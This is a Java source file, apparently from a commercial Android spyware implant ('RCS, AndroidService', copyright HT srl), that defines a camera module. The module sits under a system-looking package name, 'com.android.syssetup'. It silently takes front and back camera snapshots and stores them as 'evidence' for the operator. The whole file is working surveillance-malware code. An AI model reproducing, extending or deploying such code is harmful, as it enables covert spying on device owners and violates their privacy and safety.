/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : CameraAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/

package com.android.syssetup.module;

import android.hardware.Camera;
import android.os.Build;

import com.android.syssetup.Status;
import com.android.syssetup.auto.Cfg;
import com.android.syssetup.conf.ConfModule;
import com.android.syssetup.evidence.EvidenceBuilder;
import com.android.syssetup.evidence.EvidenceType;
import com.android.syssetup.module.camera.CameraSnapshot;
import com.android.syssetup.util.Check;
import com.android.syssetup.util.Utils;

import java.io.IOException;

//MANUAL http://developer.android.com/guide/topics/media/camera.html

/**
 * The Class ModuleCamera.
 */
public class ModuleCamera extends BaseInstantModule {

	private static final String TAG = "ModuleCamera"; //$NON-NLS-1$

	int counter = 0;


	//private boolean face;

	public static void callback(byte[] bs) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (callback), bs: " + bs.length);
		}
		EvidenceBuilder.atomic(EvidenceType.CAMSHOT, null, bs);
	}

	/*
	 * (non-Javadoc)
	 *
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
	 */
	@Override
	public boolean parse(ConfModule conf) {

		//boolean force = conf.getBoolean("force", false);
		//face = conf.getBoolean("face", false);

		return Status.self().haveCamera();
	}

	@Override
	public void actualStart() {
		try {

/*			if (ModuleCall.self() != null && ModuleCall.self().isRecording()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (actualStart), call recording, cannot get snapshot");
				}
				return;
			}*/

			snapshot();

		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart) Error: " + e);
			}
		}
	}

	/**
	 * Snapshot.
	 *
	 * @throws IOException
	 */
	private void snapshot() throws IOException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (snapshot)");
		}
		counter++;

		if (Build.VERSION.SDK_INT > Build.VERSION_CODES.HONEYCOMB) {
			final CameraSnapshot camera = CameraSnapshot.self();

			synchronized (Status.self().lockFramebuffer) {
				camera.snapshot(Camera.CameraInfo.CAMERA_FACING_FRONT);
			}
			Utils.sleep(100);
			synchronized (Status.self().lockFramebuffer) {
				camera.snapshot(Camera.CameraInfo.CAMERA_FACING_BACK);
			}

		}

	}

}
